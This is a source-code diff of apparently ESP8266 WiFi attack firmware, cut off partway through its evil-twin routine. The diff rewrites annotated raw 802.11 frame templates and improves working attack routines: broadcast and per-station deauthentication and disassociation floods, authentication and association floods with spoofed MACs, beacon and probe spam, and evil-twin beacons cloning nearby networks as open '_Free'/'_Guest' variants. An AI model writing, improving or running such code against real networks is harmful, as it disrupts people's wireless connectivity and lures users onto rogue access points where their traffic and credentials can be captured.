@@ -66,55 +66,94 @@ bool mitm_attack = false;
 bool handshakeCapture = false;
 bool aggressiveMode = false;
 
-// Enhanced packet templates with proper frame control
+// Properly structured deauth packet (26 bytes)
 uint8_t deauthPacket[26] = {
-  0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-  0x00, 0x00, 0x70, 0x6A, 0x01, 0x00
+  0xC0, 0x00,                         // Frame Control (Deauth)
+  0x3A, 0x01,                         // Duration
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (will be replaced)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (will be replaced)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be replaced)
+  0x70, 0x6A,                         // Sequence Control
+  0x01, 0x00                          // Reason Code (Unspecified)
 };
 
+// Properly structured disassoc packet (26 bytes)
 uint8_t disassocPacket[26] = {
-  0xA0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-  0x00, 0x00, 0x70, 0x6A, 0x01, 0x00
+  0xA0, 0x00,                         // Frame Control (Disassoc)
+  0x3A, 0x01,                         // Duration
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+  0x70, 0x6A,                         // Sequence Control
+  0x01, 0x00                          // Reason Code
 };
 
+// Properly structured beacon packet template
 uint8_t beaconPacket[109] = {
-  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04,
-  0x05, 0x06, 0xC0, 0x6C, 0x83, 0x1A, 0xF7, 0x8C, 0x7E, 0x00,
-  0x00, 0x00, 0x64, 0x00, 0x11, 0x04, 0x00, 0x08, 0x46, 0x52,
-  0x45, 0x45, 0x57, 0x49, 0x46, 0x49, 0x01, 0x08, 0x82, 0x84,
-  0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C, 0x03, 0x01, 0x04, 0x00
+  0x80, 0x00,                         // Frame Control (Beacon)
+  0x00, 0x00,                         // Duration
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
+  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC (will be replaced)
+  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID
+  0x00, 0x00,                         // Sequence Control
+  // Fixed parameters
+  0x83, 0x1A, 0xF7, 0x8C, 0x7E, 0x00, 0x00, 0x00, // Timestamp
+  0x64, 0x00,                         // Beacon Interval
+  0x01, 0x04,                         // Capability Info
+  // Variable parameters (SSID)
+  0x00, 0x08,                         // SSID Element ID and Length
+  'F', 'R', 'E', 'E', 'W', 'I', 'F', 'I', // SSID
+  // Supported Rates
+  0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
+  // DS Parameter Set
+  0x03, 0x01, 0x06,
+  // Country Information
+  0x07, 0x06, 0x55, 0x53, 0x20, 0x01, 0x0B, 0x1E
 };
 
-uint8_t probePacket[68] = {
-  0x40, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xFF, 0xFF, 0xFF, 0xFF,
-  0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x72, 0x72,
-  0x72, 0x72, 0x72, 0x72, 0x01, 0x08, 0x82, 0x84, 0x8B, 0x96,
-  0x24, 0x30, 0x48, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+// Probe request packet
+uint8_t probePacket[82] = {
+  0x40, 0x00,                         // Frame Control (Probe Request)
+  0x00, 0x00,                         // Duration
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
+  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC (will be replaced)
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID (Broadcast)
+  0x00, 0x00,                         // Sequence Control
+  // SSID element
+  0x00, 0x06, 't', 'e', 's', 't', 'e', 'r',
+  // Supported Rates
+  0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
+  // Extended Supported Rates
+  0x32, 0x04, 0x0C, 0x12, 0x18, 0x60,
+  // DS Parameter Set
+  0x03, 0x01, 0x06,
+  // HT Capabilities
+  0x2D, 0x1A, 0xEF, 0x09, 0x1B, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
-// Advanced attack packets
+// Authentication packet
 uint8_t authPacket[30] = {
-  0xB0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-  0x00, 0x00, 0x70, 0x6A, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00
+  0xB0, 0x00,                         // Frame Control (Authentication)
+  0x3A, 0x01,                         // Duration
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+  0x70, 0x6A,                         // Sequence Control
+  0x00, 0x00,                         // Auth Algorithm (Open System)
+  0x01, 0x00,                         // Auth Transaction Sequence
+  0x00, 0x00                          // Status Code
 };
 
+// Association request packet
 uint8_t assocPacket[30] = {
-  0x00, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-  0x00, 0x00, 0x70, 0x6A, 0x31, 0x04, 0x00, 0x00, 0x00, 0x00
-};
-
-uint8_t nullDataPacket[24] = {
-  0x48, 0x01, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-  0x00, 0x00, 0x70, 0x6A
+  0x00, 0x00,                         // Frame Control (Association Request)
+  0x3A, 0x01,                         // Duration
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+  0x70, 0x6A,                         // Sequence Control
+  0x31, 0x04,                         // Capability Info
+  0x00, 0x00                          // Listen Interval
 };
 
 // Network data structures
@@ -167,7 +206,6 @@ struct Stats {
   unsigned long probePackets = 0;
   unsigned long authPackets = 0;
   unsigned long assocPackets = 0;
-  unsigned long nullDataPackets = 0;
   unsigned long capturedPackets = 0;
   unsigned long uniqueDevices = 0;
   unsigned long handshakes = 0;
@@ -175,6 +213,22 @@ struct Stats {
   unsigned long evilTwinClients = 0;
 };
 Stats stats;
+
+// Enhanced fake WiFi SSIDs for beacon spam
+const char* fakeSSIDs[] PROGMEM = {
+  "FREE_WIFI_SECURE",
+  "FBI_Surveillance_Van",
+  "Router_McRouterface",
+  "Tell_My_WiFi_Love_Her",
+  "404_Network_Unavailable",
+  "Wu_Tang_LAN",
+  "Loading...",
+  "PASSWORD_IS_PASSWORD",
+  "Get_Your_Own_WiFi",
+  "No_Internet_Here",
+  "Connecting...",
+  "VIRUS_DETECTED"
+};
 
 // Function prototypes
 void startAP();
@@ -204,22 +258,6 @@ void saveSettings();
 void loadSettings();
 bool sendPacketSafely(uint8_t* packet, uint16_t len);
 void parseMAC(String macStr, uint8_t* macBytes);
-
-// Enhanced fake WiFi SSIDs for beacon spam
-const char* fakeSSIDs[] PROGMEM = {
-  "FREE_WIFI_SECURE",
-  "FBI_Surveillance_Van",
-  "Router_McRouterface",
-  "Tell_My_WiFi_Love_Her",
-  "404_Network_Unavailable",
-  "Wu_Tang_LAN",
-  "Loading...",
-  "PASSWORD_IS_PASSWORD",
-  "Get_Your_Own_WiFi",
-  "No_Internet_Here",
-  "Connecting...",
-  "VIRUS_DETECTED"
-};
 
 const char htmlPage[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
@@ -275,26 +313,6 @@ const char htmlPage[] PROGMEM = R"rawliteral(
             overflow-x: hidden;
         }
 
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: 
-                radial-gradient(circle at 20% 80%, rgba(248, 81, 73, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(255, 107, 53, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 40% 40%, rgba(255, 165, 0, 0.05) 0%, transparent 50%);
-            z-index: -1;
-            animation: pulse 6s ease-in-out infinite alternate;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
         .container {
             max-width: 1400px;
             margin: 0 auto;
@@ -310,24 +328,6 @@ const char htmlPage[] PROGMEM = R"rawliteral(
             border-radius: 12px;
             padding: 2rem;
             box-shadow: 0 8px 32px var(--shadow);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .header::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(248, 81, 73, 0.1), transparent);
-            animation: shimmer 3s infinite;
-        }
-
-        @keyframes shimmer {
-            0% { left: -100%; }
-            100% { left: 100%; }
         }
 
         .logo {
@@ -338,26 +338,21 @@ const char htmlPage[] PROGMEM = R"rawliteral(
             -webkit-text-fill-color: transparent;
             background-clip: text;
             margin-bottom: 0.5rem;
-            text-shadow: var(--glow-primary);
-            letter-spacing: -0.02em;
         }
 
         .tagline {
             color: var(--text-secondary);
             font-size: 1rem;
             margin-bottom: 1rem;
-            font-weight: 400;
         }
 
         .version {
-            display: inline-block;
             background: var(--gradient-primary);
             color: white;
             padding: 0.5rem 1rem;
             border-radius: 20px;
             font-size: 0.8rem;
             font-weight: 600;
-            box-shadow: var(--glow-primary);
         }
 
         .nav-tabs {
@@ -382,20 +377,6 @@ const char htmlPage[] PROGMEM = R"rawliteral(
             color: var(--text-secondary);
             text-align: center;
             font-size: 0.85rem;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .nav-tab::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: var(--gradient-primary);
-            transition: left 0.3s ease;
-            z-index: -1;
         }
 
         .nav-tab:hover {
@@ -411,22 +392,12 @@ const char htmlPage[] PROGMEM = R"rawliteral(
             box-shadow: var(--glow-primary);
         }
 
-        .nav-tab.active::before {
-            left: 0;
-        }
-
         .tab-content {
             display: none;
-            animation: fadeIn 0.5s ease;
         }
 
         .tab-content.active {
             display: block;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
         }
 
         .grid {
@@ -443,30 +414,12 @@ const char htmlPage[] PROGMEM = R"rawliteral(
             padding: 1.5rem;
             box-shadow: 0 8px 32px var(--shadow);
             transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(45deg, transparent, rgba(248, 81, 73, 0.05), transparent);
-            opacity: 0;
-            transition: opacity 0.3s ease;
         }
 
         .card:hover {
             transform: translateY(-4px);
             box-shadow: 0 12px 48px var(--shadow-heavy);
             border-color: var(--accent-primary);
-        }
-
-        .card:hover::before {
-            opacity: 1;
         }
 
         .card-title {
@@ -502,24 +455,7 @@ const char htmlPage[] PROGMEM = R"rawliteral(
             font-size: 0.85rem;
             margin: 0.25rem;
             min-width: 120px;
-            position: relative;
-            overflow: hidden;
             font-family: inherit;
-        }
-
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: left 0.5s ease;
-        }
-
-        .btn:hover::before {
-            left: 100%;
         }
 
         .btn-primary { 
@@ -560,10 +496,6 @@ const char htmlPage[] PROGMEM = R"rawliteral(
             filter: brightness(1.1);
         }
 
-        .btn:active {
-            transform: translateY(0);
-        }
-
         .btn:disabled {
             opacity: 0.5;
             cursor: not-allowed;
@@ -577,19 +509,6 @@ const char htmlPage[] PROGMEM = R"rawliteral(
             font-weight: 600;
             text-align: center;
             border: 1px solid;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .status::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
-            animation: shimmer 2s infinite;
         }
 
         .status-idle { 
@@ -623,19 +542,6 @@ const char htmlPage[] PROGMEM = R"rawliteral(
             border-radius: 8px;
             margin-top: 1rem;
             background: var(--bg-tertiary);
-        }
-
-        .network-list::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        .network-list::-webkit-scrollbar-track {
-            background: var(--bg-tertiary);
-        }
-
-        .network-list::-webkit-scrollbar-thumb {
-            background: var(--border-primary);
-            border-radius: 4px;
         }
 
         .network-item {
@@ -2374,6 +2280,7 @@ void performAdvancedAttack() {
   static unsigned long lastAttack = 0;
   static int currentAP = 0;
   static int attackVector = 0;
+  static uint16_t sequenceNumber = 0;
 
   unsigned long interval = 1000 / packetsPerSecond;
   if (aggressiveMode) {
@@ -2395,35 +2302,49 @@ void performAdvancedAttack() {
         wifi_set_channel(channel);
       }
 
-      // Enhanced multi-vector attack
+      // Enhanced multi-vector attack with proper packet construction
       switch (attackVector) {
         case 0: // Deauthentication attack
           {
+            uint8_t deauth[26];
+            memcpy(deauth, deauthPacket, sizeof(deauthPacket));
+            
             // Broadcast deauth
-            memcpy(&deauthPacket[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6); // Target: broadcast
-            memcpy(&deauthPacket[10], bssid, 6); // Source: AP
-            memcpy(&deauthPacket[16], bssid, 6); // BSSID: AP
+            memcpy(&deauth[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6); // Target: broadcast
+            memcpy(&deauth[10], bssid, 6); // Source: AP
+            memcpy(&deauth[16], bssid, 6); // BSSID: AP
+            
+            // Set sequence number
+            deauth[22] = (sequenceNumber & 0xFF);
+            deauth[23] = ((sequenceNumber >> 8) & 0x0F);
             
             uint8_t reasonCodes[] = {1, 2, 3, 4, 7, 8, 15, 16};
             for (int i = 0; i < (aggressiveMode ? 4 : 2); i++) {
-              deauthPacket[24] = reasonCodes[i % 8];
-              if (sendPacketSafely(deauthPacket, sizeof(deauthPacket))) {
+              deauth[24] = reasonCodes[i % 8];
+              deauth[25] = 0; // Reason code high byte
+              
+              if (sendPacketSafely(deauth, sizeof(deauth))) {
                 stats.deauthPackets++;
                 totalPackets++;
               }
+              sequenceNumber++;
               delayMicroseconds(100);
             }
 
             // Target specific stations
             for (const auto& station : stations) {
               if (station.ap_mac == accessPoints[currentAP].bssid) {
-                memcpy(&deauthPacket[4], station.mac_bytes, 6); // Target: station
-                memcpy(&deauthPacket[10], bssid, 6); // Source: AP
+                memcpy(&deauth[4], station.mac_bytes, 6); // Target: station
+                memcpy(&deauth[10], bssid, 6); // Source: AP
                 
-                if (sendPacketSafely(deauthPacket, sizeof(deauthPacket))) {
+                deauth[22] = (sequenceNumber & 0xFF);
+                deauth[23] = ((sequenceNumber >> 8) & 0x0F);
+                
+                if (sendPacketSafely(deauth, sizeof(deauth))) {
                   stats.deauthPackets++;
                   totalPackets++;
                 }
+                sequenceNumber++;
                 delayMicroseconds(200);
               }
             }
@@ -2432,17 +2353,26 @@ void performAdvancedAttack() {
 
         case 1: // Disassociation attack
           {
-            memcpy(&disassocPacket[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
-            memcpy(&disassocPacket[10], bssid, 6);
-            memcpy(&disassocPacket[16], bssid, 6);
+            uint8_t disassoc[26];
+            memcpy(disassoc, disassocPacket, sizeof(disassocPacket));
+            
+            memcpy(&disassoc[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+            memcpy(&disassoc[10], bssid, 6);
+            memcpy(&disassoc[16], bssid, 6);
+            
+            disassoc[22] = (sequenceNumber & 0xFF);
+            disassoc[23] = ((sequenceNumber >> 8) & 0x0F);
             
             uint8_t disassocReasons[] = {1, 2, 3, 5, 6, 7};
             for (int i = 0; i < (aggressiveMode ? 3 : 1); i++) {
-              disassocPacket[24] = disassocReasons[i % 6];
-              if (sendPacketSafely(disassocPacket, sizeof(disassocPacket))) {
+              disassoc[24] = disassocReasons[i % 6];
+              disassoc[25] = 0;
+              
+              if (sendPacketSafely(disassoc, sizeof(disassoc))) {
                 stats.disassocPackets++;
                 totalPackets++;
               }
+              sequenceNumber++;
               delayMicroseconds(150);
             }
           }
@@ -2450,18 +2380,29 @@ void performAdvancedAttack() {
 
         case 2: // Authentication flood
           {
+            uint8_t auth[30];
+            memcpy(auth, authPacket, sizeof(authPacket));
+            
             // Generate random MAC for auth flood
             for (int i = 0; i < 6; i++) {
-              authPacket[10 + i] = random(0x00, 0xFF);
+              auth[10 + i] = random(0x02, 0xFF); // Ensure locally administered
             }
-            memcpy(&authPacket[4], bssid, 6); // Target: AP
-            memcpy(&authPacket[16], bssid, 6); // BSSID: AP
+            memcpy(&auth[4], bssid, 6); // Target: AP
+            memcpy(&auth[16], bssid, 6); // BSSID: AP
+            
+            auth[22] = (sequenceNumber & 0xFF);
+            auth[23] = ((sequenceNumber >> 8) & 0x0F);
             
             for (int i = 0; i < (aggressiveMode ? 5 : 2); i++) {
-              if (sendPacketSafely(authPacket, sizeof(authPacket))) {
+              // Set authentication sequence number
+              auth[26] = (i + 1) & 0xFF;
+              auth[27] = ((i + 1) >> 8) & 0xFF;
+              
+              if (sendPacketSafely(auth, sizeof(auth))) {
                 stats.authPackets++;
                 totalPackets++;
               }
+              sequenceNumber++;
               delayMicroseconds(100);
             }
           }
@@ -2469,42 +2410,31 @@ void performAdvancedAttack() {
 
         case 3: // Association flood
           {
+            uint8_t assoc[30];
+            memcpy(assoc, assocPacket, sizeof(assocPacket));
+            
             for (int i = 0; i < 6; i++) {
-              assocPacket[10 + i] = random(0x00, 0xFF);
+              assoc[10 + i] = random(0x02, 0xFF);
             }
-            memcpy(&assocPacket[4], bssid, 6);
-            memcpy(&assocPacket[16], bssid, 6);
+            memcpy(&assoc[4], bssid, 6);
+            memcpy(&assoc[16], bssid, 6);
+            
+            assoc[22] = (sequenceNumber & 0xFF);
+            assoc[23] = ((sequenceNumber >> 8) & 0x0F);
             
             for (int i = 0; i < (aggressiveMode ? 3 : 1); i++) {
-              if (sendPacketSafely(assocPacket, sizeof(assocPacket))) {
+              if (sendPacketSafely(assoc, sizeof(assoc))) {
                 stats.assocPackets++;
                 totalPackets++;
               }
+              sequenceNumber++;
               delayMicroseconds(200);
-            }
-          }
-          break;
-
-        case 4: // Null data injection
-          {
-            memcpy(&nullDataPacket[4], bssid, 6);
-            for (int i = 0; i < 6; i++) {
-              nullDataPacket[10 + i] = random(0x00, 0xFF);
-            }
-            memcpy(&nullDataPacket[16], bssid, 6);
-            
-            for (int i = 0; i < (aggressiveMode ? 4 : 2); i++) {
-              if (sendPacketSafely(nullDataPacket, sizeof(nullDataPacket))) {
-                stats.nullDataPackets++;
-                totalPackets++;
-              }
-              delayMicroseconds(100);
             }
           }
           break;
       }
 
-      attackVector = (attackVector + 1) % 5;
+      attackVector = (attackVector + 1) % 4;
     }
 
     currentAP++;
@@ -2514,6 +2444,7 @@ void performAdvancedAttack() {
 void performBeaconSpam() {
   static unsigned long lastBeacon = 0;
   static int currentSSID = 0;
+  static uint16_t sequenceNumber = 0;
 
   if (millis() - lastBeacon > 100) {
     lastBeacon = millis();
@@ -2529,15 +2460,23 @@ void performBeaconSpam() {
       if (currentSSID < (int)ssidList.size() && ssidList[currentSSID].enabled) {
         String ssid = ssidList[currentSSID].ssid;
 
-        uint8_t packet[109];
-        memcpy(packet, beaconPacket, sizeof(beaconPacket));
+        uint8_t packet[128];
+        int packetSize = 38; // Base beacon size
 
-        // Enhanced MAC address generation
+        // Copy beacon template
+        memcpy(packet, beaconPacket, 36);
+
+        // Generate random MAC address
         packet[10] = 0x02;
         for (int i = 11; i < 16; i++) {
           packet[i] = random(0x00, 0xFF);
         }
         memcpy(&packet[16], &packet[10], 6);
+
+        // Set sequence number
+        packet[22] = (sequenceNumber & 0xFF);
+        packet[23] = ((sequenceNumber >> 8) & 0x0F);
+        sequenceNumber++;
 
         // Enhanced timestamp
         uint64_t timestamp = millis() * 1000;
@@ -2551,33 +2490,33 @@ void performBeaconSpam() {
 
         // SSID element
         int ssidLen = minVal(32, (int)ssid.length());
+        packet[36] = 0x00; // SSID element ID
         packet[37] = ssidLen;
         for (int i = 0; i < ssidLen; i++) {
           packet[38 + i] = ssid[i];
         }
+        packetSize = 38 + ssidLen;
 
-        int pos = 38 + ssidLen;
-
-        // Enhanced supported rates
-        if (pos + 10 < 109) {
-          packet[pos++] = 0x01; // Element ID
-          packet[pos++] = 0x08; // Length
-          packet[pos++] = 0x82; // 1 Mbps
-          packet[pos++] = 0x84; // 2 Mbps
-          packet[pos++] = 0x8B; // 5.5 Mbps
-          packet[pos++] = 0x96; // 11 Mbps
-          packet[pos++] = 0x24; // 18 Mbps
-          packet[pos++] = 0x30; // 24 Mbps
-          packet[pos++] = 0x48; // 36 Mbps
-          packet[pos++] = 0x6C; // 54 Mbps
+        // Add supported rates
+        if (packetSize + 10 < 128) {
+          packet[packetSize++] = 0x01; // Element ID
+          packet[packetSize++] = 0x08; // Length
+          packet[packetSize++] = 0x82; // 1 Mbps
+          packet[packetSize++] = 0x84; // 2 Mbps
+          packet[packetSize++] = 0x8B; // 5.5 Mbps
+          packet[packetSize++] = 0x96; // 11 Mbps
+          packet[packetSize++] = 0x24; // 18 Mbps
+          packet[packetSize++] = 0x30; // 24 Mbps
+          packet[packetSize++] = 0x48; // 36 Mbps
+          packet[packetSize++] = 0x6C; // 54 Mbps
 
           // DS Parameter Set
-          packet[pos++] = 0x03; // Element ID
-          packet[pos++] = 0x01; // Length
-          packet[pos++] = ssidList[currentSSID].channel;
+          packet[packetSize++] = 0x03; // Element ID
+          packet[packetSize++] = 0x01; // Length
+          packet[packetSize++] = ssidList[currentSSID].channel;
         }
 
-        if (pos <= 109 && sendPacketSafely(packet, pos)) {
+        if (sendPacketSafely(packet, packetSize)) {
           stats.beaconPackets++;
         }
         
@@ -2596,6 +2535,7 @@ void performBeaconSpam() {
 void performProbeAttack() {
   static unsigned long lastProbe = 0;
   static int currentSSID = 0;
+  static uint16_t sequenceNumber = 0;
 
   if (millis() - lastProbe > 200) {
     lastProbe = millis();
@@ -2611,28 +2551,56 @@ void performProbeAttack() {
       if (currentSSID < (int)ssidList.size() && ssidList[currentSSID].enabled) {
         String ssid = ssidList[currentSSID].ssid;
 
-        uint8_t packet[68];
-        memcpy(packet, probePacket, sizeof(probePacket));
+        uint8_t packet[80];
+        int packetSize = 24; // Base probe size
 
-        // Random MAC address
-        for (int i = 10; i < 16; i++) {
-          packet[i] = random(0, 255);
+        // Copy probe template header
+        packet[0] = 0x40; // Frame Control (Probe Request)
+        packet[1] = 0x00;
+        packet[2] = 0x00; // Duration
+        packet[3] = 0x00;
+        
+        // Broadcast destination
+        memset(&packet[4], 0xFF, 6);
+        
+        // Random source MAC
+        packet[10] = 0x02; // Locally administered
+        for (int i = 11; i < 16; i++) {
+          packet[i] = random(0x00, 0xFF);
+        }
+        
+        // Broadcast BSSID
+        memset(&packet[16], 0xFF, 6);
+        
+        // Sequence number
+        packet[22] = (sequenceNumber & 0xFF);
+        packet[23] = ((sequenceNumber >> 8) & 0x0F);
+        sequenceNumber++;
+
+        // SSID element
+        int ssidLen = minVal(32, (int)ssid.length());
+        packet[packetSize++] = 0x00; // SSID element ID
+        packet[packetSize++] = ssidLen;
+        for (int i = 0; i < ssidLen; i++) {
+          packet[packetSize++] = ssid[i];
         }
 
-        // Set SSID in probe packet
-        int ssidLen = minVal(32, (int)ssid.length());
-        if (25 < 68) {
-          packet[25] = ssidLen;
-          for (int i = 0; i < ssidLen && (26 + i) < 68; i++) {
-            packet[26 + i] = ssid[i];
-          }
+        // Add supported rates
+        if (packetSize + 10 < 80) {
+          packet[packetSize++] = 0x01; // Element ID
+          packet[packetSize++] = 0x08; // Length
+          packet[packetSize++] = 0x82; // 1 Mbps
+          packet[packetSize++] = 0x84; // 2 Mbps
+          packet[packetSize++] = 0x8B; // 5.5 Mbps
+          packet[packetSize++] = 0x96; // 11 Mbps
+          packet[packetSize++] = 0x24; // 18 Mbps
+          packet[packetSize++] = 0x30; // 24 Mbps
+          packet[packetSize++] = 0x48; // 36 Mbps
+          packet[packetSize++] = 0x6C; // 54 Mbps
+        }
 
-          int packetSize = 26 + ssidLen + 16;
-          if (packetSize > 68) packetSize = 68;
-
-          if (sendPacketSafely(packet, packetSize)) {
-            stats.probePackets++;
-          }
+        if (sendPacketSafely(packet, packetSize)) {
+          stats.probePackets++;
         }
 
         break;
@@ -2649,48 +2617,112 @@ void performProbeAttack() {
 void performEvilTwin() {
   static unsigned long lastTwin = 0;
   static int twinIndex = 0;
+  static uint16_t sequenceNumber = 0;
 
-  if (millis() - lastTwin > 500) {
+  if (millis() - lastTwin > 200) { // Faster evil twin creation
     lastTwin = millis();
 
-    if (twinIndex < accessPoints.size()) {
-      // Create evil twin beacon for selected networks
-      if (accessPoints[twinIndex].selected) {
-        String evilSSID = accessPoints[twinIndex].ssid + "_Free";
-        
-        uint8_t packet[109];
-        memcpy(packet, beaconPacket, sizeof(beaconPacket));
-
-        // Use similar MAC but modify last byte
-        memcpy(&packet[10], accessPoints[twinIndex].bssid_bytes, 6);
-        packet[15] = (packet[15] + 1) % 256;
-        memcpy(&packet[16], &packet[10], 6);
-
-        // Set evil twin SSID
-        int ssidLen = minVal(32, (int)evilSSID.length());
-        packet[37] = ssidLen;
-        for (int i = 0; i < ssidLen; i++) {
-          packet[38 + i] = evilSSID[i];
-        }
-
-        // Set as open network
-        packet[34] = 0x01; // ESS
-        packet[35] = 0x00; // No privacy
-
-        if (sendPacketSafely(packet, 109)) {
-          stats.beaconPackets++;
-          stats.evilTwinClients++;
-        }
+    // Find selected networks for evil twin
+    std::vector<int> selectedAPs;
+    for (int i = 0; i < accessPoints.size(); i++) {
+      if (accessPoints[i].selected) {
+        selectedAPs.push_back(i);
       }
     }
 
-    twinIndex = (twinIndex + 1) % accessPoints.size();
+    if (selectedAPs.size() > 0) {
+      int currentAP = selectedAPs[twinIndex % selectedAPs.size()];
+      
+      // Create multiple evil twin variations
+      String evilSSIDs[] = {
+        accessPoints[currentAP].ssid + "_Free",
+        accessPoints[currentAP].ssid + "_Guest", 
+        accessPoints[currentAP].ssid + "_Open",
+        "Free_" + accessPoints[currentAP].ssid,
+        accessPoints[currentAP].ssid + "_Public"
+      };
+
+      for (int variant = 0; variant < 3; variant++) { // Create 3 variants per cycle
+        String evilSSID = evilSSIDs[variant % 5];
+        
+        uint8_t packet[128];
+        int packetSize = 24; // Start with fixed parameters
+
+        // Create proper beacon frame
+        packet[0] = 0x80; // Frame Control - Beacon
+        packet[1] = 0x00;
+        packet[2] = 0x00; // Duration
+        packet[3] = 0x00;
+        
+        // Destination (broadcast)
+        memset(&packet[4], 0xFF, 6);
+        
+        // Source MAC (modified from original)
+        memcpy(&packet[10], accessPoints[currentAP].bssid_bytes, 6);
+        packet[15] = (packet[15] + variant + 1) % 256; // Slight variation
+        
+        // BSSID (same as source)
+        memcpy(&packet[16], &packet[10], 6);
+
+        // Sequence number
+        packet[22] = (sequenceNumber & 0xFF);
+        packet[23] = ((sequenceNumber >> 8) & 0x0F);
+        sequenceNumber++;
+
+        // Fixed parameters (timestamp, beacon interval, capability)
+        memset(&packet[24], 0, 8); // Timestamp
+        packet[32] = 0x64; // Beacon interval (100 TU)
+        packet[33] = 0x00;
+        packet[34] = 0x01; // Capability - ESS (infrastructure mode)
+        packet[35] = 0x00; // No privacy (open network)
+
+        packetSize = 36;
+
+        // SSID element
+        int ssidLen = minVal(32, (int)evilSSID.length());
+        packet[packetSize++] = 0x00; // SSID element ID
+        packet[packetSize++] = ssidLen; // SSID length
+        for (int i = 0; i < ssidLen; i++) {
+          packet[packetSize++] = evilSSID[i];
+        }
+
+        // Supported rates element
+        packet[packetSize++] = 0x01; // Element ID
+        packet[packetSize++] = 0x08; // Length
+        packet[packetSize++] = 0x82; // 1 Mbps
+        packet[packetSize++] = 0x84; // 2 Mbps
